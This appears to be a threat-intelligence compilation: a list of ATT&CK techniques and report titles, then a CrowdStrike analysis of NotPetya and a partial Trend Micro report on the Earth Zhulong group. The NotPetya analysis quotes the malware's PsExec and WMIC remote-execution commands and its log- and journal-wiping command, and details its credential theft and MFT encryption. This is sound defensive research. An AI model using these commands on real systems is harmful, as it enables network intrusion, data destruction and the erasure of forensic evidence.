T1210
T1570
T1140
T1059.003
T1218.011
T1057
T1518.001
T1106
T1003.001
T1082
T1016
T1078
T1047
T1027
T1056.001
T1083
T1053.005
T1484.001
T1005
T1055
T1204.002
T1574.002
T1071.001
T1090
T1105
T1070.004
T1562.001
T1033
T1219
T1547.001
T1566.001
T1021.001
T1543.003
T1569.002
T1036.005
T1112
T1041
T1110
T1190
T1113
T1564.001
T1012
T1573.001
T1095
T1552.001
T1074.001
T1548.002
T1068
T1072
T1557.001
Exploitation of Remote Services
Lateral Tool Transfer
Deobfuscate/Decode Files or Information
Windows Command Shell
Rundll32
Process Discovery
Security Software Discovery
Native API
LSASS Memory
System Information Discovery
System Network Configuration Discovery
Valid Accounts
Windows Management Instrumentation
Obfuscated Files or Information
Keylogging
File and Directory Discovery
Scheduled Task
Group Policy Modification
Data from Local System
Process Injection
Malicious File
DLL Side-Loading
Web Protocols
Proxy
Ingress Tool Transfer
File Deletion
Disable or Modify Tools
System Owner/User Discovery
Remote Access Software
Registry Run Keys / Startup Folder
Spearphishing Attachment
Remote Desktop Protocol
Windows Service
Service Execution
Match Legitimate Name or Location
Modify Registry
Exfiltration Over C2 Channel
Brute Force
Exploit Public-Facing Application
Screen Capture
Hidden Files and Directories
Query Registry
Symmetric Cryptography
Non-Application Layer Protocol
Credentials In Files
Local Data Staging
Bypass User Account Control
Exploitation for Privilege Escalation
Software Deployment Tools
LLMNR/NBT-NS Poisoning and SMB Relay
NotPetya Technical Analysis  A Triple Threat File Encryption MFT Encryption Credential Theft
Earth Zhulong Familiar Patterns Target Southeast Asian Firms
Malware Spotlight Camaro Dragons TinyNote Backdoor
Rorschach  A New Sophisticated and Fast Ransomware  Check Point Research
Bypassing Intel CET with Counterfeit Objects  OffSec
Emotet Strikes Again  LNK File Leads to Domain Wide Ransomware  The DFIR Report
Malware Analysis LummaC2 Stealer
FedEx Phishing Campaign Abusing TrustedForm and PAAY
Take a NetWalk on the Wild Side
Malicious OAuth applications used to compromise email servers and spread spam  Microsoft Security Blog
Nefilim Ransomware
Deja Vu All Over Again Tax Scammers at Large
Threat Assessment Black Basta Ransomware
Hafniuminspired cyberattacks neutralized by AI
eSentire Threat Intelligence Malware Analysis BatLoader
Early Bird Catches the Wormhole Observations from the StellarParticle Campaign
3CXDesktopApp Backdoored in a Suspected Lazarus Campaign  
Not just an infostealer Gopuram backdoor deployed through 3CX supply chain attack
AA21200A Tactics Techniques and Procedures of Indicted APT40 Actors Associated with Chinas MSS Hainan State Security Department
Operation Spalax Targeted malware attacks in Colombia
LAPSUS Recent techniques tactics and procedures
Detecting Credential Stealing Attacks Through Active InNetwork Defense
Understanding DNS attacks Identifying and patching vulnerabilities  Snyk
EvilExtractor  AllinOne Stealer
LockBit 20 How This RaaS Operates and How to Protect Against It
SOC Team Essentials  How to Investigate and Track the 8220 Gang Cloud Threat
Fantasy  a new Agrius wiper deployed through a supplychain attack
AA22320A Iranian GovernmentSponsored APT Actors Compromise Federal Network Deploy Crypto Miner Credential Harvester
New Horabot campaign targets the Americas
Vice Society leverages PrintNightmare in ransomware attacks
UNC215 Spotlight on a Chinese Espionage Campaign in Israel
Dark Web Profile MuddyWater APT Group
Cobalt Strike a Defenders Guide  Part 2
Tailoring Sandbox Techniques to Hidden Threats
Babadeda Crypter targeting crypto NFT and DeFi communities
Threat Assessment BlackCat Ransomware
AA21200B Chinese StateSponsored Cyber Operations Observed TTPs
Vulnerability in Essential Addons for Elementor Leads to Mass Infection
StopRansomware Royal Ransomware
GuLoader VBScript Variant Returns with PowerShell Updates
Xollam the Latest Face of TargetCompany
Operation Tainted Love  Chinese APTs Target Telcos in New Attacks
Defending Users NAS Devices From Evolving Threats
Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs
ExConti and FIN7 Actors Collaborate with New Domino Backdoor
Fat Cats
Analysis on recent wiper attacks examples and how wiper malware works
Higaisa or Winnti APT41 backdoors old and new
Operation Harvest A Deep Dive into a Longterm Campaign
Prilex Brazilian PoS malware evolution
The Rising Trend of OneNote Documents for Malware delivery
ZeroDay Vulnerability in MOVEit Transfer Exploited for Data Theft
Iranian GovernmentSponsored APT Actors Compromise Federal Network Deploy Crypto Miner Credential Harvester
FinSpy unseen findings
Vice Society Profiling a Persistent Threat to the Education Sector
Spike in LokiBot Activity During Final Week of 2022
Breaking Pedersen Hashes in Practice
Nationstate threat actor Mint Sandstorm refines tradecraft to attack highvalue targets
GuLoader Demystified Unraveling its Vectored Exception Handler Approach
Pack it Secretly Earth Pretas Updated Stealthy Strategies
Malware Reverse Engineering for Beginners  Part 2
Supply Chain Risk from Gigabyte App Center Backdoor  Eclypsium  Supply Chain Security for the Modern Enterprise
Gotta Catch Em All  Understanding the NetSupport RAT Campaigns Hiding Behind Pokemon Lures
Uncommon infection methodspart 2
German users targeted with Gootkit banker or REvil ransomware
New IcedID variants shift from bank fraud to malware delivery
BumbleBee Roasts Its Way to Domain Admin
Operation CMDStealer Financially Motivated Campaign Leverages CMDBased Scripts and LOLBaS for Online Banking Theft in Portugal Peru and Mexico
AA20336A Advanced Persistent Threat Actors Targeting US Think Tanks
Do Not Cross The RedLine Stealer Detections and Analysis
Conti Team One Splinter Group Resurfaces as Royal Ransomware with Callback Phishing Attacks
Threat Advisory 3CX Softphone Supply Chain Compromise
Malware Disguised as Document from Ukraines Energoatom Delivers Havoc Demon Backdoor
In the footsteps of the Fancy Bear PowerPoint mouseover event abused to deliver Graphite implants
Can You See It Now An Emerging LockBit Campaign
WTB Remote Mac Exploitation Via Custom URL Schemes
Dead or Alive An Emotet Story
Conti Ransomware
Microsoft research uncovers new Zerobot capabilities  Microsoft Security Blog
Just Because Its Old Doesnt Mean You Throw It Away Including Malware
Carbon Blacks TrueBot Detection
ITG10 Likely Targeting South Korean Entities of Interest to the Democratic Peoples Republic of Korea DPRK
Abusing cloud services to fly under the radar
Transparent Tribe APT36  PakistanAligned Threat Actor Expands Interest in Indian Education Sector
SYS01 Stealer Will Steal Your Facebook Info
Banking Trojan Techniques How Financially Motivated Malware Became Infrastructure
Tracking Traces of Malware Disguised as Hancom Office Document File and Being Distributed RedEyes
Attackers use domain fronting technique to target Myanmar with Cobalt Strike
Akira Ransomware is bringin 1988 back
WTB Adwind Trojan Circumvents Antivirus Software To Infect Your PC
Hungry for data ModPipe backdoor hits POS software used in hospitality sector
Update 2 3CX users under DLLsideloading attack What you need to know
GoBruteforcer GolangBased Botnet Actively Harvests Web Servers
The LockBit ransomware kinda comes for macOS
IronNetInjector Turlas New Malware Loading Tool
Dissecting One of APT29s Fileless WMI and PowerShell Backdoors POSHSPY
Hancitor Infection Chain Analysis An Examination of its Unpacking Routine and Execution Techniques
Smoking Out a DARKSIDE Affiliates Supply Chain Software Compromise
AA20258A Chinese Ministry of State SecurityAffiliated Cyber Threat Actor Activity
Phishing Campaign Targets Chinese Nuclear Energy Industry
Latin American Governments Targeted By Ransomware
Chinese Threat Actor Used Modified Cobalt Strike Variant to Attack Taiwanese Critical Infrastructure
OpenSource Gh0st RAT Still Haunting Inboxes 15 Years After Release
CrowdStrike Uncovers I2Pminer MacOS Mineware Variant
Evasive NoEscape Ransomware Uses Reflective DLL Injection
Stolen certificates in two waves of ransomware and wiper attacks
BlueNoroff introduces new methods bypassing MoTW
Fork in the Ice The New Era of IcedID
Kimsuky Strikes Again  New Social Engineering Campaign Aims to Steal Credentials and Gather Strategic Intelligence
Warning New attack campaign utilized a new 0day RCE vulnerability on Microsoft Exchange Server
Recent TZW Campaigns Revealed As Part of GlobeImposter Malware Family
MERCURY and DEV1084 Destructive attack on hybrid environment
ZipJar a little bit unexpected attack chain
Whos swimming in South Korean waters Meet ScarCrufts Dolphin
Iron Tigers SysUpdate Reappears Adds Linux Targeting
Unwrapping Ursnifs Gifts  The DFIR Report
Qakbot Returns to ISO Delivery For Now
BeeWare of Trigona An Emerging Ransomware Strain
SharpPanda APT Campaign Expands its Arsenal Targeting G20 Nations
Increasing The Sting of HIVE Ransomware
ViperSoftX Updates Encryption Steals Data
CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks
McAfee Defenders Blog NetWalker
Technical Analysis Black Basta Malware Overview
Earth Pretas Cyberespionage Campaign Hits Over 200
Updated New Evidence Emerges to Suggest WatchDog Was Behind Crypto Campaign
These arent the apps youre looking for fake installers targeting Southeast and East Asia
Tax firms targeted by precision malware attacks
BazarLoader Mocks Researchers in December 2020 Malspam Campaign
Investigation with a twist an accidental APT attack and averted data destruction
Threat actors strive to cause Tax Day headaches
Revisiting the NSISbased crypter
 LockBit Ransomware 20 Resurfaces
Too Log Didnt Read  Unknown Actor Using CLFS Log Files for Stealth
Ransom Cartel Ransomware A Possible Connection With REvil
Malicious ISO File Leads to Domain Wide Ransomware  The DFIR Report
SeroXen RAT for sale
A lookback under the TA410 umbrella Its cyberespionage TTPs and activity
When byte code bites Who checks the contents of compiled Python files
MoonBounce the dark side of UEFI firmware
Threat Actors Use MSBuild to Deliver RATs Filelessly
How to Detect Cobalt Strike
New RapperBot Campaign  We Know What You Bruting for this Time
Inside the Mind of a Cyber Attacker from Malware creation to Data Exfiltration Part 1
CatB Ransomware  File Locker Sharpens Its Claws to Steal Data with MSDTC Service DLL Hijacking
Analyzing Solorigate the compromised DLL file that started a sophisticated cyberattack and how Microsoft Defender helps protect customers
Horabot campaign targeted businesses for more than two years before finally being discovered
StopRansomware Hive Ransomware
Linux malware strengthens links between Lazarus and the 3CX supplychain attack
Tomiris called they want their Turla malware back
AA21076A TrickBot Malware
title: NotPetya Technical Analysis – A Triple Threat: File Encryption, MFT Encryption, Credential Theft url: https://www.crowdstrike.com/blog/petrwrap-ransomware-technical-analysis-triple-threat-file-encryption-mft-encryption-credential-theft/ Update: Due to naming convention consistency in the industry, CrowdStrike is now calling this variant of Petya – NotPetya. 
Executive Summary This technical analysis provides an in-depth analysis and review of NotPetya. 
For more information on CrowdStrike’s proactive protection features see the earlier CrowdStrike blog on how Falcon Endpoint Protection prevents the NotPetya attack. 
NotPetya combines ransomware with the ability to propagate itself across a network.
It spreads to Microsoft Windows machines using several propagation methods, including the EternalBlue exploit for the CVE-2017-0144 vulnerability in the SMB service.
This is the same vulnerability Microsoft reported on in MS17-010, which was exploited so successfully in the recent WannaCry ransomware outbreak. 
Once a machine is infected by NotPetya, a series of malicious activities ensue, including the following: Dropped files Process hashes and process privilege checks Credential theft Token impersonation Malware propagation Network node enumeration SMB copy and remote execution SMBv1 exploitation via EternalBlue UNC write malware to admin$ on remote target Remote execution of the malware MBR ransomware Physical drive manipulation MFT encryption File encryption System shutdown Anti-forensics Ransomware instructions for file recovery occur after the infection process has completed.
Do NOT pay the ransom.
No files will be recovered if the ransom is paid. 
Dropped Files 
The following files are dropped by the malware: 
Ransomware DLL C:\windows\perfc.dat 
The malware decompresses its resource named 0x3 of type RT_RCDATA, and writes the contents to C:\Windows\dllhost.dat.
Analysis of dllhost.dat shows that it is a copy of the PsExec utility, which is a telnet replacement that allows execution of processes on other systems. 
C:\windows\dllhost.dat Credential theft module Written as a .tmp file to the temp directory Ransomware splash and warning files Command Line Execution 
The malware is a DLL that is launched using rundll32.exe: “C:\Windows\perfc.dat”,#1 18
[“username1:pass1” “username2:pass2” … ] Perfc.dat is the malware name.
It is executed with the following arguments: #1 → This is the ordinal number of the exported function 18 → Minutes used to determine how long to wait for the scheduled shutdown “username:pass” → Credentials to be used to propagate the malware on the network. 
Process Hashes and Process Privilege Checks Upon being loaded, the malware starts a subroutine that hashes each running process on the system, and compares each hash with 3 hardcoded hashes: 0x6403527E → avp.exe associated with Kaspersky AV 0x23214B44 → ns.exe associated with Norton Security 0x651B3005 → ccSvcHst.exe associated with Symantec A global flag PROC_FLAG is used to track which of the 3 processes are running on the system. PROC_FLAG
= 0xFF → none PROC_FLAG
= 0xFB → ns.exe or ccSvcHst.exe PROC_FLAG
= 0xF7 → avp.exe PROC_FLAG
= 0xF3 → avp.exe and either ns.exe and/or ccSvcHst.exe 
In addition, within the same subroutine, the malware attempts to gain various levels of privilege.
It uses a global flag PRIV_FLAG to track the extent of privileges the malware is able to obtain. 
PRIV_FLAG = 0 → no privileges PRIV_FLAG = 1 → SeShutdownPrivilege.
Ability to shutdown the system. PRIV_FLAG
= 2 → SeDebugPrivilege.
Required to either debug or adjust memory for a process owned by another account PRIV_FLAG
= 3 → SeShutdownPrivilege & SeDebugPrivilege PRIV_FLAG
= 4 → SeTcbPrivilege.
Process can assume the identity of any user PRIV_FLAG
= 5 → SeShutdownPrivilege & SeTcbPrivilege PRIV_FLAG
= 6 → SeDebugPrivilege & SeTcbPrivilege PRIV_FLAG
= 7 → SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege These 2 flags have a considerable impact on the execution of the malware. 
The credential theft module is dropped if the malware has one of the following privileges: (It should be noted that the PROC_FLAG can any of the possible values) SeDebugPrivilege SeShutdownPrivilege & SeDebugPrivilege SeDebugPrivilege & SeTcbPrivilege SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege The MBR overwrite and MFT encryption subroutine is not executed if avp.exe is found running on the system The EternalBlue subroutine is not executed if either ns.exe or ccSvcHst.exe are found running on the system The system is rebooted using the API NtRaiseHardError if the process has at least the SeShutdownPrivilege level Credential Theft Credentials are provided to the malware in two ways: 
As an argument to the DLL (see command line execution section) Communication via a named pipe from the credential theft module To create a named pipe, a random GUID is generated, and the credential theft module is launched as a child process with the named pipe as an argument. 
Communication is constantly monitored by a thread that invokes PeekNamedPipe to copy data from the pipe. 
Credential Theft Module Depending on the OS architecture, the malware will either drop a 32-bit version or a 64-bit version of the credential theft module.
The malware decompresses a resource (0x1 if the OS is x86, 0x2 if the OS is x64) of type RT_RCDATA using zlib 1.2.8 compression.
The resulting contents are then written to a randomly named .tmp file in the %TEMP% folder. 
Upon being loaded, the module initializes and sets up a CNG provider.
It calls OpenProcess on lsass.exe with access flag set to VM_READ, and looks for the modules wdigest.dll and lsasrv.dll loaded in the lsass.exe process. 
wdigest.dll → Digest authentication security package.
Used to: Authenticate client access with integrity protection to a directory service using LDAP Authenticate client access using SASL Authenticate client access to a web site lsasrv.dll → Authentication security component.
The lsasrv.dll is a LSA (Local Security Authority)
Server service, which both enforces security policies and acts as the security package manager for the LSA This file extracts credentials from LSASS similar to Mimikatz.
The extracted credentials are sent to the NotPetya process via the named pipe. 
Token Impersonation Impersonation occurs only if the process has the required privilege level to assume the identity of another user. 
OpenProcessToken and GetTokenInformation is used to grab the TokenSessionId for terminal service sessions.
Each token is duplicated and the new handle is saved to a list. 
For each of the duplicated tokens, a new thread is created in suspended mode.
The impersonated token replaces the current thread token with SetThreadToken and the thread is resumed. 
This thread is then used to execute the SMB copy and remote execution section as the impersonated user. 
Malware Propagation The following methods are used to spread across a network: Network node enumeration SMB copy and remote execution SMB exploitation via EternalBlue Network Node Enumeration 
The malware attempts to gather a list of known TCP endpoints and IP addresses to check whether it can connect to the IPs via SMB ports 445 and 139.
The malware creates a thread for core work that invokes the following API’s: GetExtendedTcpTable to retrieve a list of TCP endpoints GetIpNetTable to retrieve the IPv4 to physical address mapping table → Gets a MIB_IPNETTABLE structure NetServerEnum to get a list of servers on the domain with the following parameters: Servername = null level = 101 (return server names, types, and associated data) NetServerGetInfoto retrieve the current configuration for the local server, specifically to determine if the system is a non-domain controller server, a primary domain controller, or a backup domain controller.
The API returns a SERVER_INFO_101 structure that contains an sv101_type field.
The malware checks to see if the value of that field is SV_TYPE_SERVER_NT, SV_TYPE_DOMAIN_CTRL, or a SV_TYPE_DOMAIN_BAKCTRL.
If the field is either of the values mentioned, the following takes place: DhcpEnumSubnets to get an enumerated list of subnets on the server DhcpGetSubnetInfo on each subnet on the list to get the DHCP_SUBNET_STATE value to see whether the DhcpSubnetEnabled flag is set DhcpEnumSubnetClients on each subnet with the aforementioned flag set.
This function returns an enumerated list of clients associated with the IP addresses in each subnet.
For each client, the following occurs: Obtains the IP address from the ClientIpAddress field in the DHCP_CLIENT_INFO structure Attempts to establish a socket connection to the client IPs over ports 445 and 139 (both associated with SMB) SMB Copy and Remote Execution There are two approaches to using valid credentials to copy and execute the malware to a remote host: Token impersonation Requires the process to have “SeTchPrivilege” Stolen credentials Each of these methods will be used to do a UNC write to Admin$ and then execute the malware on the target machine. 
SMBv1 Exploitation via EternalBlue NotPetya has the capability to exploit SMBv1 via the well known EternalBlue exploit.
Once the exploit is launched, the shellcode will end up writing the file and executing the malware on the target machine. 
UNC Write to Admin$ WNetAddConnection2W is used to connect to a server using the default credentials for the impersonated token, and an attempt is made to write the file to: \\server-name\\admin$\\malware-name UNC write to admin$ CreateFile and WriteFile are used to write the file to the remote server.
The typical filename is perfc.dat. 
Remote Execution Remote execution relies on either PsExec or WMIC. 
DLLHost.dat (psexec) The following command will execute on the remote machine: C:\Windows\dllhost.dat \\<target host> -accepteula -s
-d C:\Windows\System32\rundll32.exe “C:\Windows\perfc.dat”,#1 18 “<additional creds for arguments>”” -accepteula → This suppresses the display of the license dialog -s
→ run as system -d → do not wait for process termination -u → username (not shown here) -p → password (not shown here) WMIC 
The following command will execute on the remote as the specified user: C:\Windows\system32\wbem\wmic.exe /node:”<server name>” /user:”<username>”
/password:”<password>” process call create “C:\Windows\System32\rundll32.exe \”C:\Windows\perfc.dat\” #1 19 “<additional creds for arguments>”” /node → specify server name /user → username /password → password Process call create → execute remote command Once the command line arguments are generated, either CreateProcessAsUser or CreateProcess is executed, depending on whether this is being done through impersonation or stolen credentials. 
MBR Ransomware Physical Drive Manipulation The malware calls DeviceIOControl on //./PhysicalDrive0 with IOCTL_DISK_GET_PARTITION_INFO_EX control code to get PARTITION_INFORMATION_EX structure. 
The structure represents the physical location on the disk.
The malware takes the following steps to modify the MBR: Reads the MBR and encodes it using XOR encoding with key 0x7 The first sector is overwritten by a custom boot loader 
The next 31 sectors are then overwritten by 16-bit code that is responsible for encrypting the MFT using Salsa20 encryption Sector 32 contains the following: CRYPT_FLAG
–> Initially, this byte is set to 0, which denotes that the MFT has not been encrypted.
The 16-bit code uses this flag to determine whether to infect the MFT A random array of bytes 0x20 in length is generated using CryptGenRangom.
This is used as the Salsa20 encryption key.
In addition, another random array of bytes 0x8 in length is created using the same API call; this is used as the nonce for the encryption.
The malware also writes the hardcoded string 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX in the sector.
This is the Bitcoin wallet that is later displayed on the splash screen. 
A random blob is created by CryptGenRandom 0x3C bytes in length.
This is presented as the user’s personal installation key on the splash screen.
It should be noted that this personal installation key is random in nature; and therefore there is no way to trace it back to the victim machine Sector 33 contains all 0x7’s.
This is used as an integrity check for the decryption process. 
Sector 34 contains the original MBR that was encoded by XORing with 0x7 MFT Encryption As mentioned previously, the malware has its own custom boot loader once the machine has been infected and rebooted.
This code within the MBR is responsible for loading the code which encrypts the MFT using Salsa20, displays the ransom note, and accepts the private key.
It should be noted that the code is a low-level 16-bit code that uses BIOS interrupt calls to display text to the user, accept user input, and read/write to various sectors.
Since this code is run outside of the OS, its capabilities are quite limited. 
However, its main purpose is to encrypt or decrypt the MFT, which it is able to accomplish using Salsa20.
The following are the BIOS interrupt services used throughout the code: int 0x13 – read/write sectors on disk int 0x10 – display text int 0x19 – cause disk reboot int 0x16 – obtain keystrokes, and status of keyboard buffer The code first checks the CRYPT_FLAG in sector 32 to see whether it has been set to 1 (encrypted).
The first time a machine is infected, the CRYPT_FLAG is always set to 0 (not encrypted), which leads the malware to invoke a subroutine that displays the following decoy check disk screen to the user. 
In reality, the subroutine performs the following functions: Sets the CRYPT_FLAG to 1.
This is performed before any encryption actually takes place Encrypts the contents of Sector 33 using the Salsa20 cipher.
Shortly after the encryption, the buffer containing the Salsa20 key is overwritten; therefore, the key is destroyed Encrypts the MFT and stores
a counter of MFT records that are encrypted Causes a disk reboot Upon a second reboot, the NotPetya ransomware note is displayed as shown below: 
In addition, it initiates a loop that waits for the user to input the purchased key.
Once the key is entered, the code attempts to decrypt the contents of Sector 33, which were previously encrypted using Salsa20 key.
Once the sector is decrypted, the code reads all 512 bytes of the sector and ensures that they all equal 0x7.
If this is successful, the CRYPT_FLAG is set to 2 (decrypted), and the same key is used to decrypt the MFT. 
Furthermore, the original encoded MBR in Sector 34 is also decoded, and placed back into Sector 0, as shown below. 
File Encryption Along with MFT encryption
, the malware also targets certain files. 
The following table contains the file extensions that are targeted: .3ds .7z .accdb .ai .asp .aspx .avhd .back .bak 
.c .cfg .conf .cpp .cs .ctl 
.dbf .disk .djvu .doc .docx. 
.dwg 
.eml .fdb .gz 
.h .hdd .kdbx .mail .mdb .msg .nrg .ora 
.ost .ova 
.ovf 
.pdf .php 
.pmf .ppt .pptx .pst .pvi .py .pyc 
.rar 
.rtf 
.sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc 
.vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip 
The malware only targets fixed drives on the system.
It invokes CryptGenKey to generate an AES-128 key.
This key is used to encrypt all the files on the system.
The malware will first start enumerating files in the directory it is being executed from.
The following steps are taken to encrypt the individual files: Gets file handle Gets the file size Creates a file mapping of the file with PAGE_READWRITE protection Maps the view of the file mapping with FILE_MAP_WRITE | FILE_MAP_READ access Calls CryptEncrypt to encrypt the contents of the file using AES-128 Once the files in a folder are encrypted, the ransomware drops a ransomware note in a file named README.txt.
The “personal installation key” is the result of the AES-128 key encrypted with an RSA-2048 key, which is included in the malware. 
Once the README.txt is dropped on disk, CryptDestroyKey is invoked to release the handle to the key. 
The following message is then displayed to the user: System Shutdown NotPetya employs a few methods to ensure that the system reboots so that the boot loader loads the MFT encryptor code. 
It spawns cmd.exe with the following commandline: 
/c schtasks /Create/SC once /TN “” /TR “C:\Windows\system32\shutdown.exe /r /f”
/ST <HH:MM> 
The <HH:MM> value depends on the second parameter when being invoked by rundll32.exe.
If the second parameter is 30, the scheduled task will trigger 30 minutes after the malware execution.
However, if no second parameter is provided, the scheduled task is set to trigger 60 minutes after the malware execution by default. 
Explanation of schtask parameters: /TN → taskname (not providing a custom name forces Windows to provide a random GUID as a name) /TR → taskrun.
Path and filename of the task to be run /ST → starttime Explanation of shutdown.exe parameters: 
/r → reboot after shutdown /f → forces running applications to close In addition, it also invokes the API NTRaiseHardError.
This is an undocumented Windows API that causes the system to reboot.
If the API fails to execute, the malware calls InitiateSystemShutdownExW with the flag set to reboot the machine. 
Anti-Forensics The malware employs anti-forensics practices throughout its execution.
For instance, immediately after execution, it loads itself in memory, and deletes itself from the disk.
However, before deletion, it zeros out the file contents on disk to ensure that the malware cannot be recovered via disk forensics.
The malware uses a similar approach for the credential theft module it drops as well.
Once the contents of its resource section are decompressed and written to disk, it zeros out the memory buffer containing the decompressed PE files.
Furthermore, once execution of those files take place, it zeroes out its file contents before deleting from the disk.
The malware also spawns cmd.exe to execute the following command: 
/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D
C:” This command is responsible for clearing out the following logs: Setup logs: contains events related to application setup System logs: contains events pertaining to system components Security logs: contains events such as logon attempts, file creation, access, deletion Application logs: contains events logged by applications USN journal: maintains a record of changes made to a particular volume For information on CrowdStrike’s proactive protection features see the earlier CrowdStrike blog on how Falcon Endpoint Protection prevents this destructive ransomware. 
Appendix A: Indicators of Compromise (IOCs) 
Below is the relevant data for the files analyzed. 
File: Dropper / Payload Size: 362360 MD5: 71B6A493388E7D0B40C83CE903BC6B04 SHA256: 027CC450EF5F8C5F653329641EC1FED91F694E0D229928963B30F6B0D7D3A745 Compiled: Sun, Jun 18 2017, 7:14:36 – 32-bit DLL Signature Corrupt Subject: Microsoft Corporation Issuer: Microsoft Code Signing PCA 
File:Credential Theft Module 32-bit Size: 47616 MD5: 2813D34F6197EB4DF42C886EC7F234A1 SHA256: EAE9771E2EEB7EA3C6059485DA39E77B8C0C369232F01334954FBAC1C186C998 Compiled: Tue, Jun 6 2017, 13:31:37 – 32-bit EXE File:Credential Theft Module 64-bit Size: 57344 MD5: 7E37AB34ECDCC3E77E24522DDFD4852D SHA256: 02ef73bd2458627ed7b397ec26ee2de2e92c71a0e7588f78734761d8edbdcd9f Compiled: Tue, Jun 6 2017, 13:31:37 – 64-bit EXE File: dllhost.dat Size: 381816 MD5: AEEE996FD3484F28E5CD85FE26B6BDCD SHA256: F8DBABDFA03068130C277CE49C60E35C029FF29D9E3C74C362521F3FB02670D5 Compiled: Tue, Apr 27 2010, 0:23:59 – 32-bit EXE Version: 1.98 Signature Valid Subject: Microsoft Corporation Issuer: Microsoft Code Signing PCA The post NotPetya Technical Analysis – A Triple Threat: File Encryption, MFT Encryption, Credential Theft appeared first on . 
title: Earth Zhulong:
Familiar Patterns Target Southeast Asian Firms url: https://www.trendmicro.com/en_us/research/23/b/earth-zhulong-familiar-patterns-target-southeast-asian-firms.html Cyber Crime Earth Zhulong:
Familiar Patterns Target Southeast Asian Firms In 2022, we discovered Earth Zhulong, a hacking group that has been targeting Asian firms similar to another well-known threat actor.
In this article, we unravel their new tactics, techniques and procedures that they apply on their misdeeds. 
By: Ted Lee February 08, 2023Read time: ( words) Save to Folio Subscribe Introduction In 2022, we discovered a hacking group that has been targeting telecom, technology, and media sectors in Southeast Asia since 2020.
We track this particular group as Earth Zhulong.
We believe that Earth Zhulong is likely related to the Chinese-linked hacking group 1937CN based on similar code in the custom shellcode loader and victimology. 
In this post, we’ll introduce Earth Zhulong’s new tactics, techniques, and procedures (TTPs) in the recent campaign and the evolution of their custom shellcode loader, “ShellFang”.
Through the TTPs, we see that they are sophisticated and meticulous as malicious actors.
They adopt multiple approaches to obfuscate their tools and eliminate their footprint after finishing the operation.
As a result, we have exerted greater effort to hunt down and analyze their tools to fully understand the attack scenario.
In addition, we have verified three different variants of ShellFang were used from 2020 to 2022.
The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing. 
In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.
Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information. 
Compared to old variants, code structure in the latest variant is dramatically different and there are few shared features between old and the latest variant.
However, we found the relationship during the long-term investigation and finally correlated old variants with the latest one.
We believe the relationship found in this research could bring this notorious hacking group back to public sight and the findings here will be helpful to future research on hacker groups which are active in Southeast Asia. 
Initial Access – Lure document Back in 2020, through the command and control (C&C) domain observed in our investigation, we found a lure document with a malicious macro.
Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe.
We have identified the embedded shellcode as a Cobalt Strike shellcode which will be used to build connection to a remote hacking machine.
We believe this lure document is one of the approaches used by the threat actors to compromise their targets. 
Figure 1.
Screenshot of decoy document Figure 2.
Malicious macro embedded in the document Figure 3.
Shellcode which is used for code injection. 
Propagation through GPO In early 2022, we further observed new TTPs used to spread malware in the victim’s environment.
After getting access to the internal network, they perform domain exploration using SharpHound.
Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named “co.ps1” and create scheduled tasks for persistence. Figure 4.
Overview of attack scenario Figure 5.
PowerShell script to create a ImmediateTask through GPO 
As shown in Figure 6, threat actors use multi-layered AES encryption and base64 encoding to obfuscate “co.ps1”.
Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts.
After clearing the obfuscation, we found the script is used to deploy malware components (win.exe, gm.dll, and lengs.medil.xml) on the infected machine. 
Figure 6.
Heavily obfuscated PowerShell script Figure 7.
Cleaned content of co.ps1 Earth Zhulong adopted DLL sideloading techniques to run their malware.
“win.exe” is a renamed GoogleToolbarNotifier application.
The malicious DLL “gtn.dll”, which we named as “ShellFang”, loads when a legitimate executable is launched.
It then calls the export function, “Go”, to start the loading procedure of the encrypted payload to decrypt the payload called “lengs.medil.xml”, which is the Cobalt Strike beacon. Figure 8. win.exe file information Figure 9. win.exe will call the malicious export function in gtn.dll Evolution of ShellFang loader During the investigation, we found that Earth Zhulong started targeting Southeast Asian firms in 2020.
Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader.
Here we summarize the information we collected from 2020 to 2022 and verify three different variants used by Earth Zhulong. 
Loader prior to 2020 (Variant 1) 
The earliest variant of ShellFang was observed in a victim’s environment in 2020.
However, based on the timestamp of export function, this variant was compiled in 2017.
The code structure of ShellFang is simple.
It would read the encrypted payload (“nkford.nlp” is the payload in this case) then decrypt it and run it in the memory.
The shellcode loader used XOR with a 26 byte keyset and started a long sleep after finishing shellcode execution. Figure 10.
Main function of earliest variants Loader in 2021 (Variant 2) Compared to the variant in 2020, there was no big change in 2021.
They changed the decryption function into RC4 instead of the original XOR, but the code structure was basically the same as the previous variant. 
Figure 11.
Main function of variant in 2021 Loader in the latest campaign (2022, variant 3) Compared to previous variants, changes were seen in the code structure in variant 3.
In this variant, more anti-analysis techniques were added to strengthen their loader, including API hashing and execution flow obfuscation through exception mechanism.
Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program.
Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.
The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon. 
Figure 12.
A loop of intentional exception triggers to obfuscate control flow of program. 
Figure 13.
Necessary APIs will be dynamically resolved during execution. 
Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.
It’s worth noting that they use various programming platforms including C language, Go-Lang and Python.
In this section, we will mention some noteworthy hacking tools used in their operation. 
MACAMAX Although threat actors already installed the Cobalt Strike as backdoor, we also found out that they deployed another Go-Lang backdoor, which we named MACAMAX in the meantime.
